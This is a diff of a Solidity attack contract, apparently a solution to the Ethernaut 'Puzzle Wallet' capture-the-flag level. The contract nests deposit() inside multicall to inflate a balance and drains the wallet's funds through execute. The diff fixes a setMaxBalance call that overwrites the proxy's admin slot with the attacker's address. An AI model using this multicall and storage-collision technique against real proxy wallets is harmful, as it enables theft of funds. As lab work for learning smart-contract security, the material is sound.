@@ -6,12 +6,12 @@ import "./24-puzzlewallet.sol"; //
 contract Attack24 {
     PuzzleWallet public target;
     PuzzleProxy public proxy;
-    address public owner;
+    // address public owner;
 
     event AddedToWhiteList(address indexed _address);
 
     constructor(address payable _targetAddress) {
-        owner = msg.sender;
+        // owner = msg.sender;
         target = PuzzleWallet(_targetAddress);        
         proxy = PuzzleProxy(_targetAddress);
     }
@@ -23,9 +23,7 @@ contract Attack24 {
         // build deposit and multicall   <--  HERE hare (or in other words the github code)
 
         bytes memory deposit_sig = abi.encodeWithSignature("deposit()");
-        
         bytes[] memory deposit_sig_in_array = new bytes[](1);
-        
         deposit_sig_in_array[0] = deposit_sig;
 
         bytes memory multicall_sig = abi.encodeWithSignature(
@@ -43,14 +41,13 @@ contract Attack24 {
         );
 
         target.execute(msg.sender, address(target).balance, transfer_sig);
-        // target.setMaxBalance(uint256(msg.sender));
-
+        target.setMaxBalance(uint256(uint160(msg.sender)));
      }
 
-    function withdraw() public view {
-        require(owner == msg.sender, "not allowed, sorry");
-        // withdraw all funds using a call()
-    }
+    // function withdraw() public view {
+    //     require(owner == msg.sender, "not allowed, sorry");
+    //     // withdraw all funds using a call()
+    // }
 }
 
 
